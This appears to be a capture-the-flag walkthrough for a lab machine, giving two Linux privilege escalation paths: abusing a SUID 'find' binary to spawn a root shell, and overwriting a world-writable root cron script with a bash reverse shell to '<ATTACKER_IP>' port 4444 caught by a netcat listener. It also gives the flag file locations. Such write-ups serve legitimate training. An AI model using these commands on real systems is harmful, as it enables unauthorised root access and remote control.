## Privilege Escalation Walkthrough

This machine has two primary paths to root from a low-privilege shell.

### Path 1: SUID Misconfiguration

1.  **Enumeration:** After gaining a shell, run an enumeration script like `linpeas.sh` or manually search for SUID binaries: `find / -perm -u=s -type f 2>/dev/null`. This will reveal that `/usr/bin/find` has the SUID bit set.
2.  **Exploitation:** Look up `find` on GTFOBins. Use the provided command to spawn a root shell.
    ```bash
    /usr/bin/find . -exec /bin/sh -p \; -quit
    ```
3.  **Flag:** The flag is located at `/root/suid_flag.txt`.

### Path 2: Writable Cron Job

1.  **Enumeration:** `linpeas.sh` will highlight that the script `/usr/local/bin/backup.sh` is world-writable and is being run by a root cron job.
2.  **Exploitation:**
    * Start a Netcat listener on your attacker machine: `nc -lvnp 4444`.
    * From the victim shell, overwrite the script with a reverse shell payload:
        ```bash
        echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"' > /usr/local/bin/backup.sh
        ```
3.  **Result:** Within one minute, the cron job will execute and a root shell will connect back to your listener.
4.  **Flag:** The flag is located at `/opt/cron_flag.txt`.
